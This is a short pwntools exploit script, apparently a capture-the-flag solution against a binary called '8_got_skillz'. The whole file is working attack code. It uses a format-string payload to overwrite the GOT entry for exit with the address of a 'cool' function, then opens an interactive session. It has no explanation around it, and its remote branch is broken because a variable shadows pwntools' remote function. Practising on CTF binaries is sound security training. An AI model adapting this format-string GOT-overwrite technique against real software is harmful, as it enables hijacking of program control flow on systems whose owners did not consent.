from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./8_got_skillz"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

cool = elf.sym['cool']
log.info(elf.got)

got_exit = elf.got['exit']

payload = fmtstr_payload(15, {got_exit: cool})
pause()
p.sendlineafter("sk1llz!", payload)

p.interactive()
